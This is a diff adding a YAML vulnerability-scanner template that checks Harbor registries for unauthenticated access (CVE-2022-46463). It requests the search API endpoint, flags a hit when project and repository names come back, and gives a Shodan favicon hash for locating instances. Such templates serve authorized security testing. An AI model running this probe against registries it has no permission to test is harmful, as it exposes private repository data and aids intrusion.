@@ -1,0 +1,21 @@
+id: poc-yaml-harbor-unauthorized-access
+info:
+  name: Harbor 未授权访问漏洞(CVE-2022-46463)
+  severity: high
+  tags:
+  - CVE-2022-46463
+  - 两高一弱
+  finger: harbor
+  shodan: http.favicon.hash:657337228
+requests:
+- method: GET
+  path: /api/v2.0/search?q=/
+  expression: 'status_code == 200
+
+    && contains(body,"repository_name")
+
+    && contains(body,"project_name")
+
+    '
+variables: {}
+transport: http
